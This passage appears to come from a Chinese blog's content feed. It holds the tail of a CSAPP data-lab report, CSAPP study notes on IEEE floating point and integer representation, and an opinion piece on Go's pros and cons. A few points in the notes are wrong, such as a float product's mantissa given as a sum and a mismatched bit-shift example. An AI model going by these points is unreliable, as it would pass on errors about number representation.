class="number">1</span> &lt;&lt; (<span class="number">149</span> + x);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    frac = x + <span class="number">127</span>;</span><br><span class="line">    m = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (frac &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="结果">结果</h2>
<p>使用./driver.pl 对正确性和性能进行评估。拿到了全部的正确性和性能分数，受时间限制没有对每个函数内的操作数细扣优化，感觉有些地方还是有优化空间的。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Correctness Results     Perf Results</span><br><span class="line">Points  Rating  Errors  Points  Ops     Puzzle</span><br><span class="line">1       1       0       2       7       bitXor</span><br><span class="line">1       1       0       2       1       tmin</span><br><span class="line">1       1       0       2       9       isTmax</span><br><span class="line">2       2       0       2       9       allOddBits</span><br><span class="line">2       2       0       2       2       negate</span><br><span class="line">3       3       0       2       12      isAsciiDigit</span><br><span class="line">3       3       0       2       7       conditional</span><br><span class="line">3       3       0       2       15      isLessOrEqual</span><br><span class="line">4       4       0       2       11      logicalNeg</span><br><span class="line">4       4       0       2       49      howManyBits</span><br><span class="line">4       4       0       2       14      floatScale2</span><br><span class="line">4       4       0       2       21      floatFloat2Int</span><br><span class="line">4       4       0       2       11      floatPower</span><br><span class="line"></span><br><span class="line">Score = 62/62 [36/36 Corr + 26/26 Perf] (168 total operators)</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP - 学习笔记 (2): 浮点数</title>
    <url>/blog/2023/04/28/CSAPP-Notes-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了 CSAPP 的第二节，浮点数，介绍了如何用二进制表示小数以及 IEEE 的浮点数标准。</p>
<span id="more"></span>
<h2 id="二进制小数">二进制小数</h2>
<p>使用二进制小数点分割整数和小数部分，小数点左侧为非负幂，右侧为负幂，例如：</p>
<ul>
<li>5 3/4，浮点表示为<span class="math inline"> \(101.11_2\)</span></li>
<li>2 7/8，浮点表示为<span class="math inline"> \(10.111_2\)</span></li>
<li>1 7/16，表示为<span class="math inline"> \(1.0111_2\)</span> 可以观察到</li>
<li>除以 2 等价于右移</li>
<li>乘 2 等价于左移</li>
<li>形如<span class="math inline"> \(0.1111\cdots\)</span> 的数只小于 1.0
<ul>
<li><span class="math inline">\(1/2+1/4+\cdots+1/2^i+\cdots \rightarrow 1.0\)</span></li>
<li> 记作<span class="math inline"> \(1.0-\epsilon\)</span></li>
</ul></li>
</ul>
<h3 id="局限性">局限性</h3>
<ul>
<li>只能精确表示形如<span class="math inline"> \(x/2^k\)</span> 的小数部分（或它们的和）
<ul>
<li>其他有理数存在无限循环，无法精确表示</li>
</ul></li>
<li> w 位数的表示范围受限
<ul>
<li>需要权衡整数范围和小数部分的精度</li>
</ul></li>
</ul>
<h2 id="ieee-浮点数">IEEE 浮点数</h2>
<p>在 1985 年之前，每个计算机厂商有自己的浮点数实现，不同硬件上程序的执行完全无法预测，群魔乱舞。1985 年，IEEE 提出了标准化的浮点数表示，得到了制造商的一致采用。</p>
<h3 id="形式">形式</h3>
<p>使用一种类似科学计数法的形式表示浮点数，形式如下： <span class="math display">\[
(-1)^SM\ 2^E
\]</span></p>
<ul>
<li><span class="math inline">\(S\)</span> 是符号位，决定正负</li>
<li>尾数 <span class="math inline">\(M\in [1.0,2.0)\)</span> 是二进制小数，记为 frac</li>
<li> 指数 <span class="math inline">\(E\)</span> 表示 2 的指数，记为 exp</li>
</ul>
<h3 id="精度">精度</h3>
<p>IEEE 提供了两种精度的浮点数</p>
<ul>
<li>单精度（32 bits）：1 位 S，8 位 E，23 位 M</li>
<li> 双精度（64 bits）：1 位 S，11 位 E，52 位 M</li>
</ul>
<h3 id="规格化的值">规格化的值</h3>
<p>当 exp 的位模式不全为 1 且不全为 0 时，就属于这种情况，这是最普遍的情况。这种情况下：</p>
<p>指数 exp 被解释为偏置形式的有符号数，即<span class="math inline"> \(E=e-Bias\)</span>，其中<span class="math inline"> \(e\)</span> 是无符号整数，其位表示为<span class="math inline"> \(e_{k-1}\cdots e_1e_0\)</span>，<span class="math inline">\(Bias=2^{k-1}-1\)</span> 是一个偏置值。由此产生的精度范围，单精度是 - 126<sub>+127，双精度是 - 1022</sub>1023。</p>
<ul>
<li>以单精度为例，1 对应 - 126，254 对应 127。注意全 0 和全 1 不属于这种情况。</li>
<li>不使用补码的原因是，<strong>这种偏置表示，可以将整个浮点数看做无符号整数比较大小</strong>。
<ul>
<li>以正数为例，指数大的更大，指数相同尾数大的更大，正好匹配从高到低位逐个比较大小的比较规则。</li>
<li>如果中间的 exp 部分也是有符号的话，就无法这样比较了。</li>
</ul></li>
</ul>
<p>小数字段 frac 被解释描述小数值<span class="math inline"> \(f\in [0,1)\)</span>，其二进制为<span class="math inline"> \(0.f_{n-1}\cdots f_1f_0\)</span>，也就是二进制小数点在最高有效位左边。尾数 M 定义为<span class="math inline"> \(M=1+f\)</span>，也就是实际二进制应该为<span class="math inline"> \(1.f_{n-1}\cdots f_1f_0\)</span>，也叫作隐含的 1 开头表示。这是由于总可以调整解码 E，使得<span class="math inline"> \(M\in [1.0,2.0)\)</span>，那么就无需显式地表示这个 1。</p>
<h3 id="非规格化的值">非规格化的值</h3>
<p>当 exp 的位模式全为 0 时，对应这种情况，这种情况下：</p>
<ul>
<li><span class="math inline">\(E=1-Bias\)</span>
<ul>
<li> 这实现了非规格数到规格数的平滑过渡</li>
</ul></li>
<li><span class="math inline"> \(M=f\)</span>，不包含隐式的 1 这种格式有两个用途：</li>
<li>用于表示 0。规格化的值中，总是有<span class="math inline"> \(M\ge 1\)</span>，不能表示 0。+0.0 的位模式全部为 0：S、frac、exp 均为 0。当 S 为 1，剩余为 0 时，得到 - 0.0。根据 IEEE 的浮点格式，这两种 0 在某些方面不同，在某些方面被认为是相同的。</li>
<li>用于表示非常接近 0.0 的数，它们提供一种属性，被称为逐渐溢出。</li>
</ul>
<h3 id="特殊值">特殊值</h3>
<p>exp 全为 1 时，对应这种情况，这种情况下：</p>
<ul>
<li>若小数域全为 0，根据符号位，分别是正无穷和负无穷，当浮点操作溢出时会出现。</li>
<li>小数域非 0，表示 NaN（Not a Number），即不是一个数，例如<span class="math inline"> \(\sqrt {-1}\)</span> 或者<span class="math inline"> \(\infty-\infty\)</span>。</li>
</ul>
<h3 id="例子">例子</h3>
<p>以 8 位浮点数为例，它的范围如下： 当 exp 全为 0 时，为非规格数</p>
<ul>
<li>frac 全为 0 时，代表 0</li>
<li>frac 不为 0 时，尾数<span class="math inline"> \(M=f\)</span>，没有隐含的 1，<span class="math inline">\(E=1-Bias=-6\)</span>。随着 frac 增大 1，整个数值会增大<span class="math inline"> \(1/512\)</span>。 当 exp 不全为 0 且不全为 1 时，为规格数</li>
<li><span class="math inline"> \(E=e-Bias\)</span>，当<span class="math inline"> \(e=1\)</span> 时，<span class="math inline">\(E=-6\)</span> 与非规格数的指数一致。</li>
<li><span class="math inline">\(M=1+f\)</span>，隐含的 1，使得数值依然连续递增。 当 exp 全为 1 时，为特殊值，例如，无穷 <img src="image-20230427104857216.png"> 以 6 bit（1sign + 3 exp + 2 frac）的 IEEE 浮点数为例，数据分布如下： <img src="image-20230427105829418.png"> 在 0 附近浮点数密集存在，数轴两侧逐渐稀疏。</li>
</ul>
<h3 id="优势">优势</h3>
<ul>
<li>浮点数的 + 0 与整数 0 表示相同</li>
<li>浮点数几乎可以复用无符号整数的比较
<ul>
<li>需要先考虑符号位、-0、NaN 的问题，其他情况可以复用</li>
</ul></li>
</ul>
<h3 id="舍入">舍入</h3>
<p>在浮点数运算时，会先计算出精确值，再适配到给定位中，也就是舍入：</p>
<ul>
<li>如果指数过大，可能会溢出</li>
<li>尾数精度的限制，可能会舍入 IEEE 规定了四种舍入方式：</li>
<li>向 0：1.5-&gt;1，-1.5-&gt;-1</li>
<li> 向<span class="math inline"> \(-\infty\)</span>：1.5-&gt;1，-1.5-&gt;-2</li>
<li> 向<span class="math inline"> \(+\infty\)</span>：1.5-&gt;2，-1.5-&gt;-1</li>
<li> 向最近的偶数：四舍六入五取偶，1.4-&gt;1，1.5-&gt;2，2.5-&gt;2，-1.5-&gt;-2
<ul>
<li>0.5 特殊对待的原因是，统计上看，50% 应该舍，50% 应该入，所以根据奇偶性做不同动作</li>
<li>这是默认的舍入模式 这种舍入方式很容易可以推广到二进制，例如，把下面的二进制数保留 4 个有效位，根据有效位后的余数的大小，决定是舍还是入</li>
</ul></li>
<li>如果余数最高位为 0，代表小于一半，舍</li>
<li>如果余数最高位为 1，其余位为 0，刚好一半，根据有效位最低位决定舍入（0 代表偶数，该舍，1 代表奇数该入）</li>
<li>剩余情况，进位 <img src="image-20230427141836211.png"></li>
</ul>
<h3 id="乘法">乘法</h3>
<p><span class="math inline">\((–1)^{S_1} M_1\  2^{E_1}\ \times\ (–1)^{S_2} M_2\ 2^{E_2}\)</span> 精确结果是<span class="math inline"> \((-1)^SM\ 2^E\)</span>，其中：</p>
<ul>
<li>符号位：<span class="math inline">\(S=S_1 ^{\wedge} S_2\)</span></li>
<li> 尾数：<span class="math inline">\(M=M_1+M_2\)</span></li>
<li> 指数：<span class="math inline">\(E=E_1+E_2\)</span> 进一步修正：</li>
<li>如果<span class="math inline"> \(M\ge 2\)</span>，右移 1 位，指数 + 1</li>
<li> 如果 E 超出范围，溢出</li>
<li>把 M 舍入到 frac 的精度 除法与之类似。</li>
</ul>
<h3 id="加法">加法</h3>
<p>加减法需要先对齐指数位（对齐二进制小数点），操作后再恢复，也需要考虑修正逻辑，这里略去。</p>
<h3 id="数学性质">数学性质</h3>
<p>由于舍入和溢出的存在，浮点数的运算不满足结合律、分配律，这与整数运算不同。 以结合律为例：</p>
<ul>
<li><span class="math inline">\((2e10+3.14)-2e10=0\)</span></li>
<li><span class="math inline">\(3.14+(2e10-2e10)=3.14\)</span> 这是由于<span class="math inline"> \((2e10+3.14)\)</span> 的时候，尾数根据精度做了舍入，3.14 被省去了。 对于乘法分配律：</li>
<li><span class="math inline">\((1e20*1e20)*1e-20= inf\)</span></li>
<li><span class="math inline">\(1e20*(1e20*1e-20)= 1e20\)</span> 由于无穷的存在，也是不满足的。</li>
</ul>
<h2 id="c-语言中的浮点数">C 语言中的浮点数</h2>
<p>C 语言中，float 和 double 分别对应了 IEEE 的单精度、双精度浮点数。</p>
<h3 id="转换">转换</h3>
<p>浮点数转换时，会更改 bit 表示，这与整数的转换是不同的（只更改解释逻辑）。 当浮点数和整数转换时，会根据尾数 frac 有效位和整数位数，决定是否需要舍入。例如，当 float 转 int 时，frac 23 位可以容纳在 32 位的 int 中，不会舍入。反过来，就需要对低 9 位进行舍入判断了。</p>
<ul>
<li>double/float → int
<ul>
<li>截断小数部分</li>
<li>向 0 舍入</li>
<li>当超出范围或者 NaN 时，未定义，通常设为<span class="math inline"> \(T_{min}\)</span></li>
</ul></li>
<li>int → double
<ul>
<li>double 尾数有 53 位，精准转换，不会有精度丢失</li>
</ul></li>
<li> int → float
<ul>
<li>根据舍入模式对多余位进行处理</li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP - 学习笔记 (1): 字节与整数</title>
    <url>/blog/2023/04/28/CSAPP-Notes-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近开了个新坑，打算学习一下 CSAPP 和 Mit S6.081，会把一些学习笔记和实验报告更新在博客上。CSAPP（Computer Systems：A Programmer’s Perspective），即从程序员的角度学习计算机系统，是 CMU 的一门名课，配套同名黑书教材，译为《深入了解计算机系统》。</p>
<p>这一节是 CSAPP 的第一节，包含了整数表示、操作等。</p>
<span id="more"></span>
<p>下面是一些有用的链接，供想学习的同学参考：</p>
<ul>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/">简介 - MIT6.S081 (gitbook.io)</a></li>
<li><a href="https://csdiy.wiki/体系结构/CSAPP/">CMU 15-213: CSAPP - CS 自学指南 (csdiy.wiki)</a></li>
</ul>
<h2 id="逻辑运算">逻辑运算</h2>
<p>逻辑运算：&amp;&amp;, ||, ! 特点：</p>
<ul>
<li>0 被认为是 false</li>
<li> 非 0 值被认为是 true</li>
<li> 总是返回 true 或 false</li>
<li> 短路求值
<ul>
<li>短路求值一种友好的特性，它的优点是：</li>
</ul></li>
<li>可以用于前置判断，避免非法操作
<ul>
<li>例如，<code>p&amp;&amp;*p</code>，会先判断指针 p 地址合法，再去访问，避免错误</li>
</ul></li>
<li>可以减少无用操作
<ul>
<li>例如，<code>1||func()</code> 永远返回 true，无需调用 <code>func</code> 函数，可以提高效率 当然，短路求值也有一定的缺点</li>
</ul></li>
<li>基于跳转法实现的，短路求值需要增加很多跳转指令，会把代码块拆分为更小的基本块，给优化带来挑战
<ul>
<li>短路求值的关键是：若结果已确定则直接跳出，否则继续计算结果。需要在每次求解后插入跳转指令。</li>
<li>编译优化算法一般以跳转 / 分支拆分得到的基本块为单位，进行块内和块间优化，基本块越小、数量越多，越不利于优化 如果逻辑操作无副作用，那么可以直接使用算术法，相当于不严格按照短路求值实现，但由于无副作用，所以结果是相同的。</li>
</ul></li>
</ul>
<p>可参考 <a href="https://www.zhihu.com/question/53273670">逻辑表达式的短路是如何实现的？ - 知乎 (zhihu.com)</a></p>
<h2 id="移位">移位</h2>
<h3 id="左移-xy">左移: x&lt;&lt;y</h3>
<p>左移总是相同的，例如二进制串 "011000010" 左移 3 位后得到 "00010000"，低位用 0 补充，溢出的高位消失不见，规则同时适用于正负数。</p>
<h3 id="右移-xy">右移: x&gt;&gt;y</h3>
<p>右边的多余低位被丢弃，左侧的填充规则有两种：</p>
<ul>
<li>逻辑右移：使用 0 填充高位</li>
<li>算数右移：使用符号位填充高位 例如串 "10100010"，右移 3 位的结果分别是：</li>
<li>逻辑右移：00101000</li>
<li> 算数右移：11101000 在 C/C++ 语言中，右移均使用 "&gt;&gt;" 操作符，编译器对有符号数进行算数右移，对无符号数进行逻辑右移 在 Java 中，算数右移对应 "&gt;&gt;" 操作符，逻辑右移使用 “&gt;&gt;&gt;”。而且 Java 中只存在有符号数。</li>
</ul>
<h3 id="未定义行为">未定义行为</h3>
<p>如果把一个 8 位的数 x，左移 8 位，会发生什么？</p>
<ul>
<li>直觉来看应该是 0</li>
<li> 在大多数机器上，会得到 x 本身，因为移位的长度会对数长取模，8%8=0，即左移 0 位</li>
<li>这是一种未定义行为，不应该依赖它的结果</li>
</ul>
<h2 id="整数表示">整数表示</h2>
<h3 id="无符号数">无符号数</h3>
<p>对于 w 位的无符号整数，最小值为 0，最大值为<span class="math inline"> \(2^w-1\)</span>，所有位都被解释为正数权重，从高到底依次为<span class="math inline"> \(2^{w-1},2^{w-2},...,2^0\)</span>，数字的值为 <span class="math display">\[
B2U(X)=sum_{i=0}^{w-1}x_i\cdot 2^i
\]</span> <span class="math inline">\(B2U(X)\)</span> 表示将比特串 X 转换为无符号数的数值。</p>
<h3 id="有符号数">有符号数</h3>
<p>几乎所有的现代机器都使用补码表示。</p>
<h4 id="补码">补码</h4>
<p>补码（Two's Complement），使用最高位作为符号位，权重为<span class="math inline"> \(-2^{w-1}\)</span>，剩余位与无符号数的权重相同。 <span class="math display">\[
B2T(X)=-x_{w-1}\cdot 2^{w-1}+sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span> 在补码场景下，负数最小值的表示为<span class="math inline"> \(T_{min}=10\cdots 0\)</span>，即只有负权重，负数最大值（-1）的表示为<span class="math inline"> \(11\cdots 1\)</span>，即全部为 1，正数最大值为<span class="math inline"> \(T_{max}=01\cdots 1\)</span>。 w 位补码的表示范围为<span class="math inline"> \(-2^{w-1} \sim 2^{w-1}-1\)</span>，正数比负数少一个，这可能会导致各种边界错误。 补码标识下，正负数的转换，可以通过 <strong>取反 + 1</strong> 得到，例如 4 位数下，2 的表示为 "0010"，按位取反得到 "1101"，再 + 1 得到 “1110”，这就是 - 2.</p>
<ul>
<li>这是由于负数数量比正数多 1 个。</li>
<li><span class="math inline">\(T_{min}\)</span> 的相反数还是<span class="math inline"> \(T_{min}\)</span></li>
</ul>
<p>除了补码，还有两种标准表示方法：</p>
<h4 id="反码">反码</h4>
<p>反码（One's Complement），除了最高位的权是<span class="math inline"> \(-(2^{w-1}-1)\)</span>，不是<span class="math inline"> \(-2^{w-1}\)</span>，剩下的跟补码是一样的， <span class="math display">\[
B2O(X)=-x_{w-1}\cdot (2^{w-1}-1)+sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span></p>
<h4 id="原码">原码</h4>
<p>原码（Sign-Magnitude），最高有效位是符号位，用来确定剩下的位应该取负权还是正权： <span class="math display">\[
B2S(X)=-(-1)^{x_{w-1}}\cdot sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span> 这两种方法都有一个奇怪的属性，对于数字 0 有两种表示，把<span class="math inline"> \([00\cdots 0]\)</span> 解释为 + 0，把<span class="math inline"> \([10\cdots 0]\)</span> 解释为 - 0，虽然过去存在基于反码表示的机器，但几乎所有的现代机器都使用补码。浮点数中有使用原码。</p>
<h3 id="转换">转换</h3>
<p>无符号数和符号数的转换遵循以下规则：</p>
<ul>
<li>保留位特征，即数字的比特串存储不会改变</li>
<li>重新解释，根据比特的权重重新计算</li>
<li>可能会有未期望的效果，例如，加或减<span class="math inline"> \(2^w\)</span>，即转换出现问题</li>
<li>同时包含有符号和无符号数的表达式，有符号数会转换为无符号数 无符号数和有符号数进行比较 / 计算时，会将有符号数隐式转换为无符号数，例如<span class="math inline"> \(-1&gt;0u\)</span>，在使用时要注意。 例如，下面的代码，无符号数<span class="math inline"> \(i\ge 0\)</span> 恒成立，代码会数组越界或者死循环。</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = cnt<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) {</span><br><span class="line">    func(a[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>另外，<code>sizeof</code> 的返回值也是无符号数。 上面的倒数计数的场景，需要改写成如下形式才能正常工作，它利用了溢出的特性，第一眼看上去会很反直觉。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = cnt<span class="number">-1</span>; i &lt; cnt; i--) {</span><br><span class="line">    func(a[i]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 C 语言中，无符号数和有符号数的转换是隐式的，不会有任何的 warning 或者 error。而在 Go 语言中，需要显式对数值进行类型转换，避免了可能的问题。</p>
<h3 id="扩展">扩展</h3>
<p>如何把一个 w 位的数扩展为 w+k 位的数，数值不变？</p>
<h4 id="有符号数-1">有符号数</h4>
<p>做法是，新增的高位复制符号位，剩余位保持不变。 例如 "1100"，扩展增加 1 位，结果是 "11100"。观察可知，<span class="math inline">\(-2^3=-2^4+2^3\)</span>，最高位及更高位的权重和不变，整个结果不变。</p>
<h4 id="无符号数-1">无符号数</h4>
<p>增加 0 即可。</p>
<h3 id="截断">截断</h3>
<p>当一个 w+k 位的数去掉高 k 位时，对</p>
<ul>
<li>无符号数，等价于对<span class="math inline"> \(2^w\)</span> 取模</li>
<li>有符号数，可能正负会发生变化</li>
</ul>
<h2 id="整数运算">整数运算</h2>
<h3 id="加法">加法</h3>
<p>考虑 w 位的两个数 u,v 相加</p>
<h4 id="无符号数-2">无符号数</h4>
<p>等价于两数相加后截断只保留低 w 位（可能会有进位被丢弃） <span class="math display">\[
s=UAdd_w(u,v)=(u+v)mod 2^w
\]</span> 例如两个 4 位数，<span class="math inline">\(13+5=18\ mod\ 16=2\)</span></p>
<h4 id="补码加法">补码加法</h4>
<p>有符号的加法在比特特征上与无符号数相同，但是从表现上看，会出现两种情况：</p>
<ul>
<li>正数溢出：两个正数相加，超过<span class="math inline"> \(T_{max}\)</span>，变为负数</li>
<li>负数溢出，两个负数相加，小于<span class="math inline"> \(T_{min}\)</span>，变为正数 减法可以转换为加法求解。</li>
</ul>
<h3 id="乘法">乘法</h3>
<p>两个 w 位数相乘，可能需要至多 2w 位存储结果（考虑不可达的上界，两个 w+1 位的数相乘，最高位为 1，其余位时 0，结果为 2w+1 位）。 同样，需要截断取低 w 位，对无符号数来说，等价于取模。 对于有符号数，经过证明，其乘法与无符号数的乘法位级表示是等价的，同样可能会出现溢出现象。 由于乘法会消耗更多时钟周期（现代计算机需要 3 个），移位只需要 1 个时钟周期，编译器会对乘法进行优化。移位与无符号整数乘比特等价，进而与符号整数相乘等价。</p>
<h3 id="除法">除法</h3>
<p>同样的，除法也可以优化为右移操作，由于整数除法总是舍入到 0，对于补码除法，需要引入偏置位进行修正。</p>
<h2 id="无符号数使用建议">无符号数使用建议</h2>
<p>从前面转换一节讲的例子，可以看到无符号整数的使用可能会引发奇怪的问题。下面是一些使用无符号数的场景</p>
<ul>
<li>加密运算</li>
<li>表示集合，bitmap 需要强调的是，“无符号数适用于非负值的场景” 是一种常见的误区，一个例子就是之前提到的倒排问题。在《Go 程序设计语言》中，作者也建议了一般不要使用无符号数，除非像加密算法这种特殊的场景。</li>
</ul>
<h2 id="大端与小端">大端与小端</h2>
<p>多个字节存储时，根据字节在内存中的地址顺序，有两种存储方式，例如 0x01234567，</p>
<ul>
<li>大端，高位字节在先，01,23,45,67
<ul>
<li>网络传输</li>
</ul></li>
<li>小端，低位字节在先，67,45,23,01
<ul>
<li>x86，ARM 处理器 大端优势是读取直观，但这对计算机来说无关紧要，计算机只需要一个统一的标准进行计算即可。</li>
</ul></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 Golang 的优缺点</title>
    <url>/blog/2023/03/05/golang-talk/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近学习完了《Go 程序设计语言》一书，感觉 Golang 作为一门现代语言，优缺点都非常的明显，也在网上看了很多吐槽或者赞扬 Golang 的说法，也是各有各的理。本文从个人的主观视角，聊一下我认为 Golang 设计及使用上的一些优缺点。</p>
<span id="more"></span>
<h2 id="优点">优点</h2>
<h3 id="容易入门">容易入门</h3>
<p>Go 最为人知的一个特点就是 “大道至简”，被誉为 21 世纪的 C 语言。Go 的一大特点是上手简单容易，虽然语法规则与 C、Java 等有较大差异（例如变量声明、无类型隐式转换等），但是还是能比较快地适应。</p>
<p>Go 设计的并不复杂，容器只有数组、切片、map；并发只有 goroutine、channel；锁只有互斥锁、读写锁；编程风格只有接口和接口实现，这大大地减少了入门的学习成本和系统的复杂性。当然这种特性也可以称之为 “简陋”，也是我认为 Go 的缺点之一，后面会再提到。</p>
<h3 id="默认初始化">默认初始化</h3>
<p>C 语言的一大特点就是随机初始化，未经显式初始化的局部变量的值均为随机数。在 Go 中，所有的类型都有对应的零值，例如 bool 类型默认是 false，int 默认是 0，指针默认是 nil，struct 会递归地为每个字段赋零值。这样虽然可能会多余一些初始化的开销，但是代码会更加健壮。</p>
<p>包括像 map 访问不存在的元素时，也会默认返回零值，而不是异常。</p>
<h3 id="多返回值">多返回值</h3>
<p>C 语言一个典型的问题是不支持多返回值，这意味着要么使用特殊值做异常处理（例如 - 1，null），要么就得新建一个结构体对结果再次包装。Java 提供了 Optional 这一包装类来解决这个问题，虽然解决了这个问题，但还是无法覆盖其他多返回值需要的场景。Python 支持多返回值作为一个 tuple 返回，C++ 可以通过 pair 来部分支持。</p>
<p>Go 支持多返回值并且提供了一种良好的编程风格，即一个函数总是应该返回两个参数，结果和对应的解释：</p>
<ul>
<li>如果函数只可能存在一种失败情况，解释应该是一个 bool，标识这次操作是否成功。例如 map 查找，失败的唯一原因就是 key 不存在。</li>
<li>如果函数存在多种失败情况，解释应该是一个 error，标识操作的错误类型。</li>
</ul>
<p>这使得 Go 能够比较灵活地处理函数执行过程中可能出现的各种错误，当然这也是有代价的。</p>
<h3 id="goroutine">goroutine</h3>
<p>Go 最大、最广为人知的优点之一，可能就是 goroutine 了。goroutine 是一种用户态线程，也叫协程，由运行时去进行 m:n 调度，即 m 个操作系统线程负责 n 个 goroutine 的执行。作为用户态线程，goroutine 的切换没有系统线程切换那么大的开销，需要陷入内核、保存状态等，而且不受操作系统线程数量的限制。goroutine 的数量可以达到成千上万，而 cpu 的线程一般只有几十个。这使得 goroutine 支持相当大的并发，非常适合后端服务器的场景。</p>
<p>在 C++ 20，Java 19 中，引入了对协程的支持，Java 中的叫虚拟线程。可惜这一块蛋糕可能已经被 G 抢完了，而且多少公司还在用 c++ 11 和 java 8 呢。</p>
<h3 id="编译速度快">编译速度快</h3>
<p>相较于 C++，Go 的一个显著优点是编译速度更快，Go 的 import 支持按需导入，而且能够能够分析文件依赖，利用编译缓存加快编译速度。</p>
<h3 id="支持垃圾回收">支持垃圾回收</h3>
<p>Go 是支持垃圾回收的，有着与 Java 类似的垃圾回收机制，通过可达性分析对堆上内存进行分析回收，有时需要 stop the world，虽然略微影响性能，但是避免了指针乱飞的内存泄漏，还是值得的。C++ 虽然没有垃圾回收，但是有智能指针，使用得当也可以避免内存泄漏。</p>
<h2 id="缺点">缺点</h2>
<h3 id="err泛滥">err 泛滥</h3>
<p>写过 Go 代码的人可能都对 err 深恶痛绝，据说 Go 业务代码中可能有 50% 的代码都是：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>有人把这做成了一个表情包，来调侃 err 的滥用以及引起的代码冗余。当然，我也好想有一个按下 enter 就能输入这个 snippet 的键盘（狗头。</p>
<figure>
<img src="https://pic1.zhimg.com/80/v2-fc238ce2a5d51a01929fc54c8406e7bc_720w.webp?source=1940ef5c" alt="img"><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>这种代码泛滥的原因在于，复杂业务的每一环可能都会出错的。参数校验会出错、序列化反序列化会出错、rpc 调用会出错等等，任何一个环节出错都需要终止流程。而多返回值的风格广受认可，就导致每个函数调用都需要去判错处理，使得代码复杂而冗余。</p>
<p>Go 社区对这个问题意见很大，提出了 try 的语法糖希望简化这一判断，参见 <a href="https://github.com/golang/go/issues/56165">proposal: Go 2: error handling: try statement with handler · Issue #56165 · golang/go (github.com)</a>，不知道能否被采纳。之前 19 年关于 try 的提案是被拒绝了。</p>
<h3 id="不支持面向对象">不支持面向对象</h3>
<p>虽然 Go 中存在接口，但是并不支持面向对象。严格意义上，Go 的风格可能更适合称为面向抽象编程，而非面向对象。Go 中只存在接口和接口的实现，没有父类、继承这些概念。Go 提倡使用组合来结合功能，并提供了匿名嵌入的方法， 使得可以便捷调用嵌入结构体的方法。这也提供了一种编程风格，但是面向对象的缺失还是使得可选的代码风格减少。</p>
<h3 id="不支持函数重载">不支持函数重载</h3>
<p>作为一门现代语言，Go 不支持重载是难以置信的。Go 有很多功能相同只是参数略有差异的函数名，例如 <code>slices.ContainsInt64,slices.ContainsString</code> 分别用于判断切片中是否存在 int64 和字符串。当然这也与 Go 1.18 之前不支持泛型有关。</p>
<h3 id="内置的slice和map">内置的 slice 和 map</h3>
<p>这也是 Go 的设计失误之一。slice、map 不由标准库提供，而是内置在语言核心。这导致了一些非常奇怪、反人类的链式反应：</p>
<ul>
<li>没有好用的容器标准库，只在语言核心提供了 slice 和 map</li>
<li> 占用 map、append、len、cap 等关键词</li>
<li>难以扩展，没有通用的接口来实现新的容器类以使得支持 range、len 等</li>
<li>不满足 duck type，容器没有任何方法绑定，不能链式调用，必须使用额外的工具包函数层层套括号</li>
<li>给语言迭代更新增加了新的困难</li>
</ul>
<p>C++、Java，分别提供了 stl 库和 collection 抽象，实现了包括不限于动态数组、链表、队列堆栈、树等各种复杂的数据结构，大大减少了使用过程中造轮子的过程。作为面向对象的代表，Java 提供了丰富完备的容器接口，可以针对不同场景实现对应的容器，例如并发安全的容器。Python 虽然内置 list 和 dict，但也是以面向对象的方式提供，抽象了 len、iter 等接口，支持自定义容器类。</p>
<p>众所周知，Go 使用的是 duck type，即鸭子类型：一个东西不需要说它自己是鸭子，只要看起来像鸭子，走路、叫像鸭子，它就是鸭子。这种理念下，结构体不需要显式声明实现的接口，由编译器分析是否实现了某个接口。而 Go 语言层面的 slice 和 map 却是不支持鸭子类型的，这两个类型没有方法绑定，只能依赖语言层面提供的其他关键字，例如 len、append 等完成功能。</p>
<h3 id="简陋而固执">简陋而固执</h3>
<p>简单过了头，就是简陋。<strong>Go 目前还不支持可重入锁，直到 1.18 前，不支持泛型、TryLock 等操作</strong>。难以想象这是一门现代的编程语言。Google 团队有一种自负在里面，不愿意为了用户考虑，他们的大道至简只是去简化编译器的工作，把大部分工作量留给程序员，这是很反人类的。</p>
